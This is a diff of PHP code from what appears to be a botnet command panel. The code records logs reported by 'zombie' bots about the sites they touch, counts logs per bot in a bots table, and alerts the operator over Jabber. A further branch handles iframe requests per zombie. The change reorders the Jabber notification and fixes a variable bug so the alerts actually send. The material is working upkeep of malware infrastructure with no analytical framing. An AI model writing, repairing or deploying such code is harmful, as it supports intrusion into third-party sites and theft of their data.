@@ -7,19 +7,13 @@ if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['
     $url_check = $_GET['url'];
     $z_name = $_GET['zname'];
 
-    $select_jabber = $bdd->prepare("SELECT * FROM settings");
-    $select_jabber->execute();
-    $fetch_jabber = $select_jabber->fetch();
-    if($fetch_jabber['jabber_username'] != ''){
-        $message = "News logs from ".$_GET['url'];
-        SendJabber($fetch['jabber_username'], $fetch['jabber_password'], $fetch['jabber_to'], $message);
-    }
     
     $insert = $bdd->prepare("INSERT INTO logs_checker(url_site,logs_site,zombie) VALUES(:url_site, :logs_site, :zombie)");
     $insert->bindParam(':url_site', $url_check);
     $insert->bindParam(':logs_site', $info);
     $insert->bindParam(':zombie', $z_name);
     $insert->execute();
+    
     
     $select = $bdd->prepare('SELECT * FROM bots WHERE name = :name');
     $select->bindParam(':name', $z_name);
@@ -29,6 +23,13 @@ if(isset($_GET['info']) && isset($_GET['url']) && $_GET['info'] != '' && $_GET['
         $update = $bdd->prepare("UPDATE bots SET numbers_logs = numbers_logs + 1 WHERE name = :name");
         $update->bindParam(':name', $z_name);
         $update->execute();
+    }
+    $select_jabber = $bdd->prepare("SELECT * FROM settings");
+    $select_jabber->execute();
+    $fetch_jabber = $select_jabber->fetch();
+    if($fetch_jabber['jabber_username'] != ''){
+        $message = "News logs from ".$url_check;
+        SendJabber($fetch_jabber['jabber_username'], $fetch_jabber['jabber_password'], $fetch_jabber['jabber_to'], $message);
     }
 }
 elseif(isset($_GET['iframe']) && $_GET['iframe'] != '' && isset($_GET['zombie']) && $_GET['zombie'] != ''){
